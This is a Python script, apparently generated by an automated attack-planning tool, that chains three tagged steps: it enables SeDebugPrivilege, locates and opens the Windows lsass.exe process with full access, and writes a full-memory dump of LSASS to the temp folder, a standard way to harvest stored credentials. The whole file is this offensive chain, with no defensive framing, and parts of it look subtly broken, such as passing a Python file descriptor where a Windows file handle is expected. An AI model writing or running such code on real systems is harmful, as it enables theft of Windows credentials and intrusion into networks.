#!/usr/bin/env python3
import sys, json, time, os
from typing import Dict, Any
import ctypes
import win32security
from ctypes import wintypes

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Check if the current user is an admin
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

        # Attempt to acquire SeDebugPrivilege
        has_debug = False
        try:
            # Open the process token
            hToken = win32security.OpenProcessToken(
                win32security.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            
            # Get the LUID for SeDebugPrivilege
            luid = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
            
            # Adjust the token privileges to enable SeDebugPrivilege
            new_privileges = [(luid, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, new_privileges)
            
            # Check if the privilege was successfully enabled
            has_debug = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
            has_debug = any(privilege[0] == luid and privilege[1] == win32security.SE_PRIVILEGE_ENABLED for privilege in has_debug)
        
        except Exception:
            # If any error occurs during privilege adjustment, assume failure
            has_debug = False

        result = {
            "is_admin": is_admin,
            "has_debug": has_debug
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Check if we have the necessary privileges
        is_admin = input_data.get('is_admin', False)
        has_debug = input_data.get('has_debug', False)

        if not (is_admin and has_debug):
            raise PermissionError("Insufficient privileges to access LSASS.")

        # Constants for process access
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

        # Get a handle to the LSASS process
        # Enumerate processes to find LSASS
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        psapi = ctypes.WinDLL('Psapi', use_last_error=True)

        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ('dwSize', wintypes.DWORD),
                ('cntUsage', wintypes.DWORD),
                ('th32ProcessID', wintypes.DWORD),
                ('th32DefaultHeapID', ctypes.POINTER(wintypes.ULONG)),
                ('th32ModuleID', wintypes.DWORD),
                ('cntThreads', wintypes.DWORD),
                ('th32ParentProcessID', wintypes.DWORD),
                ('pcPriClassBase', ctypes.c_long),
                ('dwFlags', wintypes.DWORD),
                ('szExeFile', ctypes.c_char * 260)
            ]

        CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
        Process32First = kernel32.Process32First
        Process32Next = kernel32.Process32Next
        OpenProcess = kernel32.OpenProcess

        TH32CS_SNAPPROCESS = 0x00000002
        INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value

        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot == INVALID_HANDLE_VALUE:
            raise Exception("Failed to create process snapshot.")

        process_entry = PROCESSENTRY32()
        process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

        if not Process32First(snapshot, ctypes.byref(process_entry)):
            kernel32.CloseHandle(snapshot)
            raise Exception("Failed to retrieve first process.")

        lsass_pid = None
        while True:
            if process_entry.szExeFile.decode('utf-8') == "lsass.exe":
                lsass_pid = process_entry.th32ProcessID
                break
            if not Process32Next(snapshot, ctypes.byref(process_entry)):
                break

        kernel32.CloseHandle(snapshot)

        if lsass_pid is None:
            raise Exception("LSASS process not found.")

        # Open the LSASS process
        handle = OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
        if not handle:
            raise Exception("Failed to open LSASS process.")

        result = {
            "handle": handle,
            "pid": lsass_pid
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract handle and pid from input_data
        handle = input_data.get('handle')
        pid = input_data.get('pid')

        # Define the path for the memory dump
        dump_path = os.path.join(os.environ['TEMP'], f'lsass_dump_{pid}.dmp')

        # Open the process with the given handle
        process_handle = ctypes.windll.kernel32.OpenProcess(
            0x001F0FFF,  # PROCESS_ALL_ACCESS
            False,
            pid
        )

        if not process_handle:
            raise Exception("Failed to open process")

        # Create the dump file
        with open(dump_path, 'wb') as dump_file:
            # Use MiniDumpWriteDump from DbgHelp.dll to create the dump
            dbghelp = ctypes.windll.dbghelp
            success = dbghelp.MiniDumpWriteDump(
                process_handle,
                pid,
                dump_file.fileno(),
                2,  # MiniDumpWithFullMemory
                None,
                None,
                None
            )

            if not success:
                raise Exception("Failed to write memory dump")

        # Get the size of the dump file
        dump_size = os.path.getsize(dump_path)

        # Close the process handle
        ctypes.windll.kernel32.CloseHandle(process_handle)

        result = {
            'path': dump_path,
            'size': dump_size
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Access LSASS [credential-access] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Access LSASS): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Access LSASS): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Dump Memory [credential-access] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Dump Memory): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Dump Memory): FAILED — {err}')
            failed.append('T3')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))